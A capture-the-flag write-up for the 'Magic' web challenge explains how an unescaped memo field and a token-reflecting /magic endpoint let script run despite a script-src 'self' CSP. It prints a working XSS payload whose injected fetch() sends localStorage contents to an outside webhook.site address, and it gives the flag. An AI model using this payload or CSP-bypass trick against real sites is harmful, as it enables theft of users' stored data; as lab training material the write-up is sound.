# Magic

Category: Web

> Can you find the trick?

This is quite a complex XSS challenge, but it's very fun to solve.

Logging into the site, we find a field to enter a memo. The memo will then be saved and displayed back to the user. Fortunately, the app forgot to HTML escape this field, which allows us to run an XSS attack. However, the major challenge is overcoming the restrictive CSP:

`Content-Security-Policy: style-src 'self' ; script-src 'self' ; object-src 'none' ; font-src 'none'`

Popping this into the [CSP Evaluator](https://csp-evaluator.withgoogle.com/) only gives 1 warning: 

```
script-src
	'self' can be problematic if you host JSONP, Angular or user uploaded files.
```

Hmm, it doesn't seem the site does any of this things. Or does it?

Doing a bit more poking around, we discover an autologin feature. Each user has a unique token, which automatically logs them in when they go to `/magic?token=<token>`. However, when the token is wrong, it is echoed back, with some protections:

```js
function escapeHTML(string) {
  return string
    .replace(/\&/g, "&amp;")
    .replace(/\</g, "&lt;")
    .replace(/\>/g, "&gt;")
    .replace(/\"/g, "&quot;")
    .replace(/\'/g, "&#x27");
}
```

This seems pretty decent against regular XSS. But can we exploit it in a different context?

It turns out that when a browser sees `<script src="http://site.com/stuff"></script>` it fetches `stuff` from `http://site.com` and executes it as JavaScript (as long as it fulfills CSP). There is no check if `stuff` is actually a JavaScript file. So you could go `<script src="https://google.com">` and your browser would fetch Google and execute it as JavaScript. 

Thus, we could do `<script src="/magic?token=<js here>//">` to execute arbitrary JS code. The only restriction is we're not allowed to use `'` or `"`, but we can easily circumvent that by using backticks (`` ` ``). From reading the source of the crawler, we know the flag is stored in `localStorage`. Thus, our payload would be

```html
<script src="https://magic.quals.beginners.seccon.jp/magic?token=fetch([`https://webhook.site/747c4c4a-6eeb-4eba-877e-5438363a0a47`,localStorage.getItem(`memo`)].join(`/`))//"></script>
```

`Flag: ctf4b{w0w_y0ur_skil1ful_3xploi7_c0de_1s_lik3_4_ma6ic_7rick}`

This exploit is kind of like shellcode for web I suppose.